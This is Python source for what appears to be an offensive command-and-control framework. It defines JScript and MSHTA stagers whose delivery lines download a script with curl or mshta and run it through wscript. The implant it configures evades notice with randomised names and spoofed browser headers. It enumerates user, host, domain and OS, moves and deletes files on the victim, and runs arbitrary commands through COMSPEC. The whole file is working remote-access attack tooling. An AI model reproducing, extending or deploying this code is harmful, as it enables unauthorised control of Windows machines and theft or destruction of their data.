import urllib.parse as parse

from connect import util

class Stager():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.variables = {}
        self.functions = {}
        self.setup_variables()
        self.setup_functions()

    def setup_variables(self):
        pass

    def setup_functions(self):
        pass

class JScriptStager(Stager):

    format = 'jscript'
    deliveries = [f'curl.exe -endpoint- -o connect.js & wscript /e:jscript connect.js',]

    def __init__(self, ip, port):
        super().__init__(ip, port)

    def setup_variables(self):
        self.variables['errors'] = (util.generate_str(), 0)
        self.variables['file-system-object'] = (util.generate_str(), 'new ActiveXObject("Scripting.FileSystemObject")')
        self.variables['host'] = (util.generate_str(), self.ip)
        self.variables['port'] = (util.generate_str(), self.port)
        self.variables['post-req'] = (util.generate_str(), '')
        self.variables['sleep'] = (util.generate_str(), 3000)
        self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
        self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
        self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')
        self.variables['wscript.shell'] = (util.generate_str(), 'new ActiveXObject("WScript.Shell")')
        self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')

        wscript = self.variables['wscript.shell'][0]
        self.variables['compsec'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMSPEC%")')
        self.variables['domain'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERDOMAIN%")')
        self.variables['hostname'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMPUTERNAME%")')
        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%")')
        self.variables['product-name'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName")')
        self.variables['tmp'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%TMP%")')
        self.variables['build-number'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")')

    def setup_functions(self):
        # Enumeration Options
        self.functions['domain'] = util.Function('domain', 'Enumerates the current domain from environment variables', 'Enumeration Options', None)
        self.functions['hostname'] = util.Function('hostname', 'Enumerates the current hostname from environment variables', 'Enumeration Options', None)
        self.functions['os'] = util.Function('os', 'Enumerates the current operating system product name and build number', 'Enumeration Options', None)
        self.functions['sleep'] = util.Function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'Enumeration Options', None)
        self.functions['tmp'] = util.Function('tmp', 'Enumerates the temporary directory from environment variables', 'Enumeration Options', None)
        self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables', 'Enumeration Options', None)
        self.functions['sysinfo'] = util.Function('sysinfo', 'Enumerates the username, hostname, operating system and domain', 'Enumeration Options', [self.functions['whoami'], self.functions['os'], self.functions['hostname'], self.functions['domain']])

        # File System Options
        self.functions['dir'] = util.Function('dir','Query directory information (e.g., dir "remote_path")',  'File System Options', None)
        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload file:local_filename, "remote_path")', 'File System Options', None)
        self.functions['download'] = util.Function('download','Download a file to the remote system (e.g., download "remote_path" "return_format")', 'File System Options', None)
        self.functions['mkdir'] = util.Function('mkdir','Creates a new directory on the remote system (e.g., mkdir "remote_path")', 'File System Options', None)
        self.functions['deldir'] = util.Function('deldir','Delete a directory on the remote system (e.g., deldir "remote_path")', 'File System Options', None)
        self.functions['cpdir'] = util.Function('cpdir','Copy a directory on the remote system (e.g., cpdir "remote_source" "remote_destination")', 'File System Options', None)
        self.functions['mvdir'] = util.Function('mvdir','Move a directory on the remote system (e.g., mvdir "remote_source" "remote_destination")', 'File System Options', None)
        self.functions['delfile'] = util.Function('delfile','Delete a file on the remote system (e.g., delfile "remote_path")', 'File System Options', None)
        self.functions['cpfile'] = util.Function('cpfile','Copy a file on the remote system (e.g., cpfile "remote_source" "remote_destination")', 'File System Options', None)
        self.functions['mvfile'] = util.Function('mvfile','Move a file on the remote system (e.g., mvfile "remote_source" "remote_destination")', 'File System Options', None)

        # Command Execution Options
        self.functions['comspec'] = util.Function('comspec', 'Executes commands with the command sepecifier (e.g., comspec "command")', 'Command Execution Options', [self.functions['delfile'], self.functions['download']])

class MSHTAStager(JScriptStager):

    format = 'mshta'
    deliveries = [f'mshta -endpoint-',]

    def __init__(self, ip, port):
        super().__init__(ip, port)
